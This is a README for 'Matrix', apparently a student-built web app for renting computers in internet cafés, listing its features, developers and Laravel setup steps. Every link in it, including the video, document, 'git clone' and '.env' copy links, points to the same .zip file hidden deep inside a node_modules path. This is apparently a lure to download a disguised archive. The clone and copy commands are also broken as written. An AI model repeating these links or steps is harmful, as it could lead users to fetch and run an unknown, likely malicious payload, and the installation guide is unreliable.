MATRIX - Web-Based Internet Café Computer Rental Application

This is the official repository for Matrix, a web-based computer rental platform developed for internet cafés (warnet) as part of the Proyek Berbasis Pembelajaran (PBL) course in the Informatics Engineering Study Program, Politeknik Negeri Batam.

 Demo & Presentation Videos
1. AAS Presentation : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
2. ATS Presentation : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
3. Product Demonstration : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip

Documentation
1. AAS Documents: https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
2. ATS Documents: https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip

About the Project
Matrix is an online platform designed to manage the rental of computers in internet cafés. It supports both users (customers) and administrators (warnet staff) through a role-based system. Customers can register, top-up balance, rent computers, and track their usage. Administrators can monitor active rentals, manage accounts, update information, and generate reports.


Project Developers
This application was developed by the following students from Politeknik Negeri Batam:
- Nasrullah - 3312401030
- Arabella Advania Ginting - 3312401049
- Nabila Maya Shafira - 3312401053
- Salsa Putri Ajriyanti - 3312401043


 Key Features
🔐 User registration and login
💳 Top-up system for balance management
🖥️ Computer rental booking and usage tracking
📅 Rental history and top-up history
⚙️ Admin dashboard for monitoring and control
📈 Reports for daily transactions and usage
🧾 Digital invoice generation
📢 Information & event management by admin


Installation Guide
To run this project locally, follow the steps below:

1. Clone the Repository

git clone https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
cd project-matrix-pbl

2. Install Dependencies

composer install
npm install && npm run dev

3.  Environment Setup

cp https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip .env
php artisan key:generate

4. Run Migrations and Seeders

php artisan migrate --seed

5. Launch the Server

php artisan serve


Then access the app at:
http://127.0.0.1:8000


